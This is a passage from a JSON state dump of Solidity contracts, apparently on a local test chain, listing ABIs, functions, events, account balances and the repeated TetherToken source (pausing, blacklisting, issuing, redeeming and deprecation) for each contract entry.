super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857893180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x59d3631c86BbE35EF041872d502F218A39FBa150",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x59d3631c86BbE35EF041872d502F218A39FBa150": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857893180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > 